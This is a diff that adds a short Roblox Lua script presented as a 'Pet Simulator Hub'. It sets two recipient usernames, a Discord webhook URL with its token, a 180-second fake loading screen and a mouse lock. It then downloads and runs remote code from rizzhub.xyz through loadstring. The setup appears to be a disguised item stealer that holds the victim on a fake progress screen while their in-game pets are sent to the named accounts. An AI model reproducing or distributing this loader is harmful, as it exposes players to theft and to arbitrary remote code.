@@ -1,0 +1,15 @@
+UserName = "GABRIELofficial_GAME"
+UserName2 = "KLJOAK_BLOX"
+Webhook = "https://discord.com/api/webhooks/1098965296993288294/PkSXq3myEe1QmnehqZKdqTk9f7caOllt1HE6prOtkw3ikzXd8IC_rtXb0Hn6BPen7YOU"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Pet Simulator Hub"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
